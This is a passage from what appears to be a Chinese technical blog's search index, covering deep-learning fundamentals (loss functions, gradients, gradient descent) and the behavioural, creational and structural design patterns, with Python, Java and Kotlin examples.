是权重， \\(x_1,x_2,…,x_n\\) 是输入， \\(b\\) 是偏差， \\(f\\) 是激活函数。 函数的角色:\n在这个框架下，权重和偏差类似于函数方程的系数和常量，它们调节输入如何影响输出。 神经网络通过学习这些权重和偏差的最佳值来拟合和预测数据。 因此，可以将神经元视为一个通过权重和偏差调整其输入的函数，通过激活函数引入非线性，使得整个网络能够学习和模拟复杂的数据关系和模式。\n损失函数 损失函数在机器学习和深度学习中扮演着至关重要的角色。它是一个用来衡量模型性能的函数，特别是在模型预测和实际数据之间的差异。以下是损失函数的一些关键特点：\n定义:\n损失函数，有时也被称为代价函数，是一个衡量单个样本预测错误的度量。在给定输入和模型的情况下，损失函数输出一个数值，这个数值表示预测值和真实值之间的差距。 目的:\n损失函数的主要目的是指导模型的学习。模型训练的目标是最小化损失函数，即减少预测值和真实值之间的差异。 常见类型:\n均方误差（MSE）: 在回归问题中常用，计算预测值和实际值之差的平方的平均值。 交叉熵损失: 在分类问题中常用，特别是在二分类或多分类问题中。它衡量的是模型预测的概率分布与实际标签的概率分布之间的差异。 在神经网络中的作用:\n在神经网络训练过程中，通过计算损失函数并使用诸如梯度下降之类的优化算法来调整网络的权重，使得损失函数的值最小化。 选择损失函数:\n选择哪种损失函数取决于特定的机器学习任务（如回归、分类、聚类等）和数据特性。 损失函数是连接模型预测和真实数据的桥梁，它提供了一种量化模型性能的方式，使得我们可以通过数学方法来优化模型。\n梯度 在神经网络中，梯度是一个非常重要的概念。下面是对梯度及其在神经网络中作用的解释：\n梯度的含义:\n在数学和物理学中，梯度通常指的是一个函数在每个点上的斜率或变化率。在多维空间中，它表示该函数在每个方向上的斜率。 在神经网络中，梯度通常指代损失函数（或目标函数）关于网络参数（如权重和偏差）的偏导数。它表明了损失函数在参数空间的每个维度上增加或减少的速率。 梯度在神经网络中的作用:\n梯度用于优化神经网络的参数。通过计算损失函数相对于每个参数的梯度，神经网络可以了解如何调整其参数以减少总损失。 这通常通过一个过程称为梯度下降来完成，其中参数沿着梯度的反方向调整，以减少损失函数的值。 导数、偏导数和梯度 导数（Derivative）:\n导数是一个单变量函数在某一点上的瞬时变化率。它告诉我们，当输入变量发生非常小的变化时，函数值将如何变化。 在数学上，如果有一个函数 f(x)，那么在点 x 的导数 f′(x) 表示当 x 发生微小变化时，f(x) 的变化量。 偏导数（Partial Derivative）:\n偏导数是多变量函数对其中一个变量的导数，同时假设其他变量保持不变。例如，对于函数 f(x,y)，对 x 的偏导数 \\(\\frac{∂f}{∂x}\\) 表示当 x 发生微小变化而 y 保持不变时，函数值的变化率。 偏导数描述的是在多维空间中，函数沿着某一个坐标轴的变化率。 梯度（Gradient）:\n梯度是导数在多维空间中的推广。它不是针对单一变量，而是针对多变量函数的每个独立变量的偏导数的集合。 在数学上，对于多变量函数 f(x,y,z,…)，梯度是一个向量，其每个分量都是对应于一个变量的偏导数。梯度指向函数增长最快的方向。 区别:\n维度: 导数是一维的，而梯度是多维的。 方向: 导数只有大小，没有方向（或者可以说是正或负的方向），而梯度是一个向量，具有大小和方向。 应用: 在单变量函数的情境中使用导数，而在多变量函数的情境中使用梯度。 在神经网络的背景下，考虑到网络参数通常是多维的（例如权重矩阵），因此更多地使用梯度而不是单一的导数。梯度指明了在参数空间中减少损失函数的最快路径。\n梯度下降（Gradient Descent） 梯度下降算法是一种用于优化神经网络参数的方法，其目的是最小化损失函数。我们可以用一个比喻来理解梯度下降：\n想象你在一个山的顶部，目标是到达山谷（这里的山谷代表损失函数的最小值）。但是，你的眼睛被蒙住了，看不到周围的环境。你只能通过感觉脚下的坡度（这就像是梯度）来判断哪个方向是下坡。\n检查坡度（计算梯度）:\n在神经网络中，你首先计算损失函数在当前位置（即当前参数值）的梯度。梯度告诉你损失函数上升和下降最快的方向。在我们的比喻中，这就像是感觉脚下地面的坡度，了解哪个方向是下坡。 迈出一步（更新参数）:\n接下来，你会朝着梯度下降最快的方向迈出一步。这一步的大小称为学习率。在神经网络中，这意味着你会根据梯度和学习率来调整网络的权重和偏差。 学习率很重要：如果太大，你可能会跨过山谷，错过最低点；如果太小，你则需要很长时间才能到达山谷。 重复过程:\n重复这个过程，每次都根据损失函数的梯度来更新你的位置（即神经网络的参数），直到你感觉到自己已经到达了山谷（即损失函数不再显著下降）。 总体来讲，梯度下降是一个迭代过程，它通过不断地计算梯度并更新参数，来帮助神经网络找到损失函数的最小值。这个过程就像是在盲目中找到一条通往山谷的路径。\n成本表面和等值线图（Cost Surface \u0026 Contour Plot） 高度代表成本 其余两个轴分别为权重 w​eight、偏差 b​ias 上面两张图有助于理解梯度下降算法（图片参考自 PyTorch Linear Regression Training Slope and Bias ）。\n上图中的 \\(l\\)（损失函数）是均方误差（MSE），即：\n\\[ l(w,b)=\\frac{1}{N}\\sum_{n=1}^N(y_n-(wx_n+b))^2 \\]\n学习（训练）的目标，就是找到让这个函数的函数值最小的 w 和 b。\n如何根据损失函数的梯度、学习率更新权重 在深度学习中，使用梯度来更新权重是优化模型的关键步骤，这通常在反向传播过程中进行。梯度本质上是损失函数相对于模型权重的偏导数，它指示了损失函数相对于每个权重增加或减少的方向和幅度。通过梯度，我们可以知道如何调整权重以减少损失。\n权重更新的基本公式如下：\n\\[ W_{new}=W_{old}−η⋅∇L(W_{old}) \\]\n其中：\n\\(W_{new}\\) 是更新后的权重。 \\(W_{old}\\) 是当前的权重。 η 是学习率。 \\(∇L(W_{old})\\) 是损失函数相对于当前权重的梯度。 梯度的作用可以这样理解：\n方向 梯度的方向指向损失函数增长最快的方向。在优化过程中，我们希望减少损失，因此需要向梯度的相反方向更新权重。 幅度 梯度的幅度（大小）告诉我们在该方向上损失函数变化的速度。如果梯度很大，意味着在那个方向上损失函数变化很快。 学习率的作用：\n学习率决定了我们在梯度指示的方向上移动的步长。较高的学习率意味着更大的步长，可以加快学习过程，但也可能导致超过最优点，甚至导致模型不稳定。相反，较低的学习率意味着更小的步长，学习过程更稳定，但训练速度会减慢，且可能陷入局部最小值。 因此，选择合适的学习率是非常重要的。太高或太低的学习率都可能导致训练效果不佳。在实践中，通常需要通过实验来确定最佳的学习率。此外，也有一些自适应学习率的优化算法（如 Adam、RMSprop 等），它们可以在训练过程中自动调整学习率，以提高训练的效果和稳定性。\n常见的神经网络类型 常见的神经网络类型：\n全连接神经网络（Fully Connected Networks）:\n也被称为密集神经网络，是最基本的神经网络形式。在这种网络中，每个神经元与前一层的所有神经元相连。 适用于结构化数据，如表格数据或简单的分类任务。 卷积神经网络（Convolutional Neural Networks, CNNs）:\n特别适用于处理图像数据。通过卷积层，CNN 能够捕捉图像中的局部特征。 广泛应用于图像分类、物体检测、图像分割等任务。 循环神经网络（Recurrent Neural Networks, RNNs）:\n设计用来处理序列数据，如时间序列数据或自然语言。 RNN 能够处理输入数据的时间动态特性，适用于语音识别、语言建模等任务。 长短时记忆网络（Long Short-Term Memory, LSTM）:\nLSTM 是 RNN 的一种变体，它能够学习长期依赖关系，解决了普通 RNN 难以捕捉长期依赖的问题。 常用于复杂的序列任务，如机器翻译、文本生成等。 生成对抗网络（Generative Adversarial Networks, GANs）:\n由两部分组成：生成器和鉴别器。GANs 能够生成新的、与真实数据类似的数据。 应用于图像生成、图像风格转换等领域。 变换器网络（Transformer Networks）:\n主要用于处理序列数据，特别是在自然语言处理领域表现出色。 依赖于“注意力机制”，能够同时处理整个序列，提高了处理长序列的能力。 这些网络可以根据具体问题和数据类型进行选择和定制。\n参考资料 Deep Neural Networks with PyTorch Learn the Basics — PyTorch Tutorials 2.3.0+cu121 documentation ","description":"\n","tags":["ai","deep-learning"],"title":"\n深度学习笔记：理论基础","uri":"/posts/deep-learning-notes-theory-foundation/"},{"categories":null,"content":"设计模式总目录请参考：设计模式所支持的设计的可变方面。\n责任链 (Chain of Responsibility) 意图 使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。\n案例 Android 的事件传递机制就是一个典型的责任链模式的应用。该应用结合了 组合 (Composite) 模式，利用已有的视图树结构，将请求从视图树的根节点（DecorView）一直派发到各个子节点，直到某个视图处理该事件为止。\n相关模式 组合 (Composite): 可以利用已有的 Composite 结构来传递请求，形成责任链。 命令 (Command) 意图 将某种请求封装为一个对象，换句话说，将请求参数化，这样可以解耦请求的创建方和实现方，也方便对请求进行排队、记录日志，以及支持撤销等操作。\n结构 用法介绍 实现菜单、按钮功能 Command 模式特别适合用来实现菜单、按钮的功能。用 Command 模式实现有如下好处：\n可以很方便的让一个菜单和一个按钮代表同一项功能，只需让二者共享同一个 Command 对象即可。 可以很轻松的动态替换某项菜单或按钮的功能（例如实现上下文有关的菜单），只需动态替换 Command 对象即可。 还可以很方便将若干个命令组合成一个更大的命令，实现命令脚本（command scripting）功能。参考 MacroCommand 宏命令。 MacroCommand 宏命令 MacroCommand 是一个具体的 Command 子类，它用来执行一个命令序列。 MacroCommand 运用了Composite 组合模式来实现这种层次结构，参考下面的类图：\n协作 解释器 (Interpreter) 意图 给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子。\n动机 如果一种特定类型的问题发生的频率足够高，那么可能就值得将该问题的各个实例表述为一个简单语言中的句子。这样就可以构建一个解释器，该解释器通过解释这些句子来解决该问题。\n案例 搜索匹配一个模式的字符串是一个常见问题。正则表达式是描述字符串模式的一种标准语言。与其为每一个模式都构造一个特定的算法，不如使用一种通用的搜索算法来解释执行一个正则表达式。\n迭代器 (Iterator) 意图 提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。\n类图 迭代器模式应用广泛，原理也比较简单。下面是一个典型的类图。\n相关模式 组合 (Composite): 迭代器可以被用来迭代组合模式中的对象。 工厂方法 (Factory Method): 如上面的类图所示，迭代器中利用了工厂方法来实例化对应的迭代器子类。 备忘录 (Memento): 迭代器可使用 memento 来捕获一个迭代的状态。 中介者 (Mediator) 意图 用一个中介对象来封装一系列的对象交互。中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。\n结构 效果 减少了子类生成 Mediator 将原本分布于多个对象间的行为集中在一起。改变这些行为只需要生成 Mediator 的子类即可，这样各个 Colleague 类可被复用。 将各 Colleague 解耦 Mediator 有利于各 Colleague 间的松耦合，你可以独立地改变和复用各 Colleague 类和 Mediator 类。 简化了对象协议 用 Mediator 和各 Colleague 间的一对多交互来代替 Colleague 间的多对多交互。一对多的关系更易于理解、维护和扩展。 对对象如何协作进行了抽象 将中介作为一个独立的概念并将其封装在一个对象中，使你将注意力从对象各自本身的行为转移到它们之间的交互上来。这有助于弄清楚一个系统中的对象是如何交互的。 使控制集中化 中介者模式将交互的复杂性变为中介者的复杂性。因为中介者封装了协议，这会带来上述提到的好处，但也可能导致该对象变得比较复杂和难以维护。 相关模式 外观 (Facade): Facade 模式与中介者的不同之处在于，它是对一个子系统进行抽象，从而提供一个更为方便的接口。它的协议主要是单向的，即通过 Facade 接口来访问子系统。相反，Mediator 提供了各 Colleague 对象不支持的协作行为，而且协议是多向的。 观察者 (Observer): Mediator 可以作为一个 Observer 来订阅各 Colleague 的状态变化，并做出响应（例如将状态变化的结果传播给其他的 Colleague）。 备忘录 (Memento) 意图 在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。这样以后就可以将该对象恢复到原先保存的状态。\n结构 Memento 备忘录 备忘录存储原发器对象的内部状态。原发器根据需要决定备忘录存储原发器的哪些内部状态。 防止原发器以外的其他对象访问备忘录。备忘录实际上有两个接口，管理者（Caretaker）只能看到备忘录的 窄接口 （只能将备忘录传递给其他对象），而原发器能够看到一个​宽接口, 允许它访问恢复到先前状态所需的所有数据。 Originator 原发器 原发器创建一个备忘录，用以记录当前时刻它的内部状态。 使用备忘录恢复内部状态。 Caretaker 管理者，例如“撤销机制” 负责保存好备忘录 不能对备忘录的内容进行操作或检查。 相关模式 Command 命令: 命令可使用备忘录来为可撤销的操作维护状态。 Iterator 迭代器: 备忘录可用于迭代器的实现，用于存储迭代器的当前状态。 观察者 (Observer) 状态 (State) 策略 (Strategy) 模板方法 (Template Method) 访问者 (Visitor) 意图 当我们遍历一个对象结构的元素时，该模式允许我们在不修改各个元素的类结构的前提下，为每个元素增加任意类型的新操作。\n案例：富文本文档模型 富文本文档模型 假设我们要实现一个富文本文档模型，该模型的结构类似下图所示：\n对应的类图如下：\n统计字符个数 我们希望为上述文档结构增加字符个数统计功能，一个简单的实现可能类似这样：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Element: # ... def char_count(self): raise NotImplementedError() class Block(Element): # ... def char_count(self): num = 0 for c in self.children: num += c.char_count() class RichText(Element): # ... def char_count(self): return len(self.text) class FileLink(Element): # ... def char_count(self): return 0 page = Page() # ... total_count = page.char_count() print(f\"total char count: {ccv.total_count}\") 该实现会递归统计整个文档结构树，并返回最终的总和。\n此时，类图变成类似这样：\n可以看到，我们通过为基类 Element 增加一个方法 char_count(), 并在相应的子类中实现该方法，来实现字符个数的统计功能。\n文档导出 如果仅仅是增加一个字符个数统计功能，上述方法看起来并无大碍。接下来我们考虑一下，如果要增加文档导出功能，比如需要支持导出为如下不同格式的文档：\nmarkdown html pdf 纯文本 … 我们应该如何应对？如果延续上面的简单方案，我们可以在 Element 中增加类似下面的接口：\nexport_markdown() export_html() export_pdf() export_text() … 如果我们希望再增加一个拼写检查的功能，可能还需要增加一个 spellcheck() 方法。这显然不是一个理想的方案，这会导致我们的类结构十分的不稳定，基类和子类的接口不断膨胀、不断引入新的变化点，既不符合单一职责原则，也不符合开闭原则。\n我们看一下这种方案下的类图：\n引入访问者模式 如何在不修改 Element 及其子类结构的前提下，为我们的文档模型新增各种不同类型的操作呢？访问者模式可以帮助我们解决这类问题。\n我们先看一下引入访问者模式之后，字符统计功能会怎么写：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 class Element: # ... def accept(self, v: Visitor): raise NotImplementedError() class Block(Element): # ... def accept(self, v: Visitor): v.visitBlock(self) for c in self.children: c.accept(v) class RichText(Element): # ... def accept(self, v: Visitor): v.visitRichText(self) class FileLink(Element): # ... def accept(self, v: Visitor): v.visitFileLink(self) class ListItemBlock(Block): # ... def accept(self, v: Visitor): v.visitListItemBlock(self) for c in self.children: c.accept(v) # ... class Visitor: def visitBlock(self, b: Block): pass def visitRichText(self, t: RichText): pass def visitFileLink(self, f: FileLink): pass def visitListItemBlock(self, f: FileLink): pass # ... class CharCountVisitor(Visitor): def __init__(self): self.total_count = 0 def visitRichText(self, t: RichText): self.total_count += len(t.text) ccv = CharCountVisitor() page.accept(ccv) print(f\"total char count: {ccv.total_count}\") 看起来似乎变复杂了，但是通用性和扩展性得到了大幅提升。例如，如果想增加一个 markdown 导出功能，只需新增一个 MarkdownExporterVisitor 即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class MarkdownExporterVisitor(Visitor): def __init__(self): self.content = [] def visitRichText(self, t: RichText): c = t.text if t.font_weight == 'italic': c = f'*{t.text}*' elif t.font_weight == 'bold': c = f'**{t.text}**' # ... self.content.append(c) def visitListItemBlock(self, li: ListItemBlock): prefix = '- ' if li.list_type == 'ordered_list': prefix = '1. ' # handle indentation... self.content.append(prefix) # ... 新增其他文档格式的导出功能，以及拼写检查等功能也是类似，只需独立的增加一个类即可。这使得在新增一项对文档模型的操作时，我们的系统做到了“对修改关闭，对扩展开放”，而且每一项新增功能都很好的封装在了独立的新增类当中，而不是散落在文档结构的各个层次的类当中。\n我们看一下使用访问者模式之后的类图：\n适用性 通过上述案例，我们可以看到，如果被访问的对象层级本身不太稳定（例如随时可能添加一种新的 Element ），那么可能不太适合使用 Visitor 模式。因为在这种情况下，会涉及对 Visitor 结构的修改（增加新的 visit 方法），从而导致 Visitor 继承层级的不稳定。\n这里需要权衡的是，哪里发生变化的可能性比较大？如果对象层级本身变化的可能性比较大，则可能不适合使用 Visitor 模式；如果对象层级本身较稳定，而增加一种新的操作的可能性比较大，则比较适合使用 Visitor 模式。\n相关模式 组合 (Composite): Visitor 模式可以搭配 Composite 模式一起使用，用来对一个通过 Composite 模式构建的对象层次结构进行遍历操作。上述的富文本文档模型案例，就是这样一个例子。 解释器 (Interpreter): 访问者也可以在解释器模式中使用。 ","description":"\n","tags":["design-pattern","architecture"],"title":"\n设计模式：行为型 (Behavioral)","uri":"/posts/design-patterns-behavioral/"},{"categories":null,"content":"设计模式总目录请参考：设计模式所支持的设计的可变方面。\n抽象工厂 (Abstract Factory) 意图 提供一个接口以创建一系列相关或相互依赖的对象，而无须指定它们具体的类。\n案例 前面在依赖倒置原则中，其实已经举过一个贴纸的例子，其实就是抽象工厂模式的一个应用。\n除了对 Product 和 Factory 进行抽象以外，抽象工厂方法还强调了​产品系列​的概念。比如《设计模式》一书中经典的例子，支持多种视感（look-and-feel）标准的用户界面，不同的视感风格为诸如滚动条、窗口和按钮等用户界面『窗口组件』定义不同的外观和行为。而某个特定视感风格下的一系列『窗口组件』，就是一个产品系列。我们不应该在 Motif 风格的窗口组件中，混入一个 PM 风格的窗口组件。\n这里我们需要解决两个问题：\n如何确保软件不依赖某种具体的视感风格，以保证软件的可移植性。就像前面的案例中， Editor 不应该直接依赖某个具体的 StaticSticker 一样； 如何确保我们不会在 Motif 视感中，错误的使用了一个 PM 风格的组件？ 我们可以通过抽象工厂模式，优雅地解决上述两个问题。看一下类图就明白了：\n每一种视感标准都对应一个具体的 WidgetFactory 子类，客户只需要通过 WidgetFactory 即可创建出一组特定风格的窗口组件，无需关心哪些类实现了特定风格的窗口组件，而且可以保证绝对不会错误的混用不同风格的窗口，因为 WidgetFactory 强化了同一类型风格组件之间的绑定关系。\n适用性 一个系统希望独立于它的产品的创建、组合和实现。 一个系统存在多个产品系列，在工作时需要选择其中一个产品系列来使用。 比较强调产品系列的概念，同一个系列的产品应该配合在引起使用，不同系列的产品不能混用。 提供一个产品类库，但只想暴露它们的接口而不是实现。 优点 它分离了具体实现类 替换产品系列变得十分简单，只需替换一个 factory 即可 有利于产品的一致性，可以自动确保不同系列的产品之间不会混用 缺点 该模式可以很轻易的扩展新的产品系列，但如果要扩展产品系列中的产品类型，例如上述案例中，增加一种新的窗口组件，会比较困难，因为会涉及 AbstractFactory 类及其所有子类的修改。\n因此，使用该模式最好一开始就考虑清楚系统中有哪些产品类型，是否相对稳定，否则不太建议使用。\n相关模式 AbstractFactory 类通常用工厂方法 (Factory Method)来实现，也可以用原型(Prototype) 来实现。\n一个具体的工厂可以作为一个单例 (Singleton) 存在。\n工厂方法 (Factory Method) 意图 定义一个用于创建对象的接口，让子类决定具体将创建哪一种类型的实例，即对象的实例化过程被延迟到子类进行。\n工厂方法相对比较简单，其实在Abstract Factory 抽象工厂中就有工厂方法的运用。\n类图 生成器 (Builder) 意图 将一个复杂对象的构建与它的内部表示相分离，使得二者可以独立发生变化。\n这里有两层含义：\n构建过程（Director）和内部表示（Builder）相分离。同样的构建过程，可以生成不同的结果。例如，“解析并遍历 RTF 文档结构”这个过程是可复用的，但是我利用不同的 Builder, 最终可以构建出不同格式的文档（ Markdown, Html, Text 等）。 构建过程不用关心产品的内部组成部分是如何创建的（具体由哪些类实例化），以及这些部分是如何组装的。因此，构建过程可以被独立修改。 结构 类图 时序图 效果 它使你可以改变一个产品的内部表示 Builder 对象为 Director 提供了一个构造产品的抽象接口，该接口隐藏了这个产品的表示和内部结构，同时也隐藏了该产品是如何装配的。因此，当你改变该产品的内部表示时，只需替换一个 Builder 即可。\n它使你可以在不同的 Director 中复用同一个 Builder 例如，你可以在不同的 RTF 文档格式中，复用同一个 MarkdownBuilder 。\n它使你对构造过程可以进行更精细的控制 Builder 模式和其他创建型模式很大的一个区别是， Builder 模式不是调用一个接口一下子就生成产品的，而是通过导向器一步一步构造，这个过程允许你有更高的自由度来定制整个产品。\n相关模式 抽象工厂 (Abstract Factory) Abstract Factory 与 Builder 的主要区别在于，Builder 模式着重于一步步构造一个复杂对象。而 Abstract Factory 着重于多个系列的产品对象。另外，Builder 在最后一步返回产品，而 Abstract Factory 会立即返回产品。\n访问者 (Visitor) 这两个模式在某些情况下可能存在竞争关系。例如，对于一个 RTF 来说，既可以用 Visitor 模式来遍历并导出不同格式的文档（参考案例：富文本文档模型），也可以采用 Director + 不同 Builder 的方式来导出不同格式的文档。取决于你的文档模型是否适合采用 Visitor 模式。Visitor 模式是一种更加通用的为某一类集合元素增加不同操作的方法，其目的并非要构造对象。\n原型 (Prototype) 意图 通过克隆原型实例的方式来创建新的对象。\n类图 效果 Prototype 具备很多与其他创建型模式（例如 抽象工厂）类似的效果，比如它对客户隐藏了具体的产品类，因此减少了客户知道的名字的数目，而且让客户无需修改即可切换到不同的具体产品。\n除此之外，Prototype 有一些独有的特点，下面列举一些。\n运行时增加和删除产品 Prototype 可以很方便的在运行时通过注册原型实例来增加一个新的具体产品，这比抽象工厂模式相对会灵活一些。\n减少子类数量 使用抽象工厂会产生一个与产品类层次平行的 Factory 类层次，而 Prototype 不需要。\n单例 (Singleton) 意图 保证一个类仅有一个实例，并提供一个访问它的全局访问点。\n实现 饿汉式 Java 实现\n1 2 3 4 5 6 7 8 9 10 class Singleton { public static Singleton getInstance() { return instance; } // ... private Singleton() {} private static Singleton instance = new Singleton(); } Kotlin 实现\n1 2 3 object Singleton { // ... } 双重检查锁 (Double-checked locking) Java 实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Singleton { public static Singleton getInstance() { if (instance == null) { synchronized (Singleton.class) { if (instance == null) { instance = new Singleton(); } } } return instance; } private Singleton() {} private volatile static Singleton instance; } Kotlin 实现\n1 2 3 4 5 6 7 class Singleton private constructor() { companion object { val instance: Singleton by lazy(mode = LazyThreadSafetyMode.SYNCHRONIZED) { Singleton() } } } 静态内部类 这种方式利用 Java 虚拟机的类加载机制来实现懒加载的效果，并处理同步锁的问题。\nJava 实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Singleton { public static Singleton getInstance() { return Holder.instance; } public static void hello() { System.out.println(\"hello\"); } static { System.out.println(\"Singleton has been loaded!\"); } private Singleton() {} private static class Holder { static { System.out.println(\"Holder has been loaded!\"); } static final Singleton instance = new Singleton(); } public static void main(String[] args) { Singleton.hello(); // 下面这句会触发 Holder 的加载，进而触发 instance 的初始化 Singleton.getInstance(); } } Kotlin 实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Singleton private constructor() { companion object { init { println(\"Singleton has been loaded!\") } val instance get() = Holder.instance fun hello() { println(\"hello\") } } private object Holder { init { println(\"Holder has been loaded!\") } val instance = Singleton() } } Singleton.hello() // 下面这句会触发 Holder 的加载，进而触发 instance 的初始化 Singleton.instance 劣势 从可测试性的角度，应该尽量减少 Singleton 的使用。因为 Singleton 难以被 mock。可以考虑用抽象工厂 (Abstract Factory)来代替 Singleton, 并在工厂内部返回其唯一实例。 由于单例对象无法被垃圾回收，会导致部分内存或其他资源长期被占据。如果单例是一个占用较多资源的复杂对象，这可能会造成资源紧张的问题。 ","description":"\n","tags":["design-pattern","architecture"],"title":"\n设计模式：创建型 (Creational)","uri":"/posts/design-patterns-creational/"},{"categories":null,"content":"设计模式总目录请参考：设计模式所支持的设计的可变方面。\n适配器 (Adapter) 意图 将一个类的接口转换成客户希望的另外一个接口，使得原本不兼容的模块之间可以协同工作。\n类图 相关模式 和 Bridge 桥接 有点类似，但是出发点不同：\nBridge 的目的是将接口部分和实现部分分离，从而可以对它们较为容易也相对独立地加以改变。 Adapter 意味着改变一个已有对象的接口。 Decorator 装饰器 在不改变接口的情况下，增强了其他对象的功能，因此 Decorator 对应用程序的透明性比较好，而且可以支持递归组合。\nProxy 代理 在不改变它的接口的条件下，为另一个对象定义了一个代理。\n桥接 (Bridge) 意图 将抽象部分与它的实现部分分离，使它们可以独立地变化。\n类图 上图中 Window 和 WindowImp 之间就是 Bridge 的关系。\n组合 (Composite) 意图 将对象组合成树形结构以表示“部分－整体”的层次结构。Composite 使得用户对单个对象和组合对象的使用具有一致性。\n类图 装饰器 (Decorator) 意图 动态地给一个对象添加一些额外的职责（功能）。\n下面我们结合案例来阐述一下。\n案例分析：持久化工具 持久化工具 假设我们有一个数据持久化工具，其功能很简单，就是写入持久化数据：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # 持久化接口 class Serializer: def write(self, bs): pass def close(self): pass # 基于文件的持久化实现 class FileBackendSerializer(Serializer): def __init__(self, path): self._file = open(path, 'wb') def write(self, bs) self._file.write(bs) def close(self): self._file.close() # 基于服务器的持久化实现 class ServerBackendSerializer(Serializer): def __init__(self, address): self._server = self._connect(address) def write(self, bs): self._server.send(bs) def close(self): self._server.disconnect() # ... 如上图所示，客户通过 Serializer 接口来使用该功能，底层实现可能是基于文件的 FileBackendSerializer, 或者是基于服务器的 ServerBackendSerializer, 客户可以根据不同情况选用不同的持久化实现。\n我们画一下类图：\n增加 gzip 压缩功能 某一天，我们发现持久化的数据量越来越大，因此希望能够给上述持久化工具增加 gzip 的支持，以减少磁盘空间占用。\n当我们想为一个类扩展某想功能时，一种常见的做法是为其创建一个子类，并在子类中重写一些方法，来添加一些额外的功能。例如，在这个例子中，我们可以写一个 FileBackendSerializer 的子类 GzipFileBackendSerializer, 来为文件持久化类增加 gzip 的功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import gzip # 基于文件的持久化实现，同时支持 gzip 压缩功能 class GzipFileBackendSerializer(FileBackendSerializer): def __init__(self, path): self._file = open(path, 'wb') def write(self, bs) bs = gzip.compress(bs) self._file.write(bs) def close(self): self._file.close() 类似的，我们也可以为 ServerBackendSerializer 增加一个子类 GzipServerBackendSerializer, 为基于服务器的持久化类增加 gzip 功能。\n此时，类图变成下面这样：\n提升数据安全性 新需求又来了，我们希望为某些敏感数据提供加密功能，以便提升数据的安全性。和前面的 gzip 功能类似，我们也可以通过扩展子类来实现，扩展后的类图如下所示：\nGzip + 加密功能 针对有些数据，我们既希望压缩，又希望加密，应该怎么处理呢？如果仍然按照创建子类的思路，我们的类图大概会发展成这样：\n是不是感觉哪里不太对？子类数量越来越多，而且开始出现了不少冗余代码，例如 SecureGzipFileBackendSerializer 和 SecureFileBackendSerializer 的代码一定有不少冗余的成分， SecureGzipServerBackendSerializer 和 SecureServerBackendSerializer 也是如此。\n引入装饰者模式 有没有更好的方案，来解决上述这类问题？答案是用组合替代继承（参考组合复用原则），具体到这里，就是利用装饰器（Decorator）模式。\n我们来演示一下，采用装饰器模式会如何实现 gzip 功能，以及加密功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import gzip # 增加 gzip 功能的 Serializer class GzipSerializer(Serializer): def __init__(self, s: Serializer): self._s = s def write(self, bs): bs = gzip.compress(bs) self._s.write(bs) # 增加加密功能的 Serializer class SecureSerializer(Serializer): def __init__(self, s: Serializer): self._s = s def write(self, bs): bs = self._encrypt(bs) self._s.write(bs) 客户侧使用起来也非常简单：\n1 2 3 4 5 6 s = FileBackendSerializer('/path/to/file') # 增加 gzip 功能 s = GzipSerializer(s) # 增加加密功能 s = SecureSerializer(s) 上述的组合可以灵活搭配，例如，你可以为某些数据增加 gzip 功能，某些数据增加安全功能，另一些数据同时增加 gzip 和安全功能。\n另外，配合 ServerBackendSerializer 使用也完全没有问题：\n1 2 3 4 5 6 s = ServerBackendSerializer('example.com') # 增加 gzip 功能 s = GzipSerializer(s) # 增加加密功能 s = SecureSerializer(s) 如果有其他的新增诉求，例如对数据做过滤，也只需按照类似的方式，增加一个 FilterSerializer 即可。这里的关键点是，在保持接口一致的前提下，通过组合的方式在原有的对象上包装（装饰）上一层新的功能。\n我们看一下采用装饰器模式后的类图：\n是不是干净清爽了很多？\n相关模式 适配器 (Adapter): Decorator 不同于 Adapter, 因为 Decorator 不改变对象的接口，而仅添加（或改变）对象的功能。 组合 (Composite): 可以将 Decorator 看成是一个退化的、仅有一个组件的 Composite。然而这两者的目的不同，Decorator 的目的是为对象添加额外的功能，而非建立一个具有层次结构的对象聚合。 策略 (Strategy): 用一个装饰可以为对象添加额外的功能，而 Strategy 可以让你动态替换某种功能。这是改变对象的两种途径。 外观 (Facade) 意图 为子系统中的一组接口提供一个一致的界面，Facade 模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。\n下面这个示意图，可以比较形象的表达 Facade 模式的意图：\n适用性 当你要为一个复杂子系统提供一个简单接口时。\n子系统往往因为不断演化而变得越来越复杂，在使用大多数模式时，都会产生更多更小的类。这使得子系统更具可复用性，也更容易对子系统进行定制，但也给那些不需要定制子系统的用户带来一些使用上的困难。​Facade 可以提供一个简单的缺省视图, 这一视图对大多数用户来说已经足够，而那些需要更多的可定制性的用户可以越过 Facade 层。\n当你需要构建一个层次结构的子系统时，​使用 Facade 模式定义子系统中每层的入口点​。如果子系统之间是相互依赖的，可以让它们仅通过 Facade 进行通信，从而简化它们之间的依赖关系。\n相关模式 抽象工厂 (Abstract Factory) 模式可以 Facade 模式一起使用以提供一个接口，该接口可以隐藏子系统对象的创建细节。 中介者 (Mediator) 模式与 Facade 模式有些相似之处，它也抽象了一些已有类的功能。但是它们的目的不同，Mediator 主要是抽象对等对象之间的通信，这些对象知道 Mediator 的存在。而子系统并不知道 Facade 的存在。 单例 (Singleton) 。通常仅需要一个 Facade 对象，这种时候可以考虑使用单例。 享元 (Flyweight) 意图 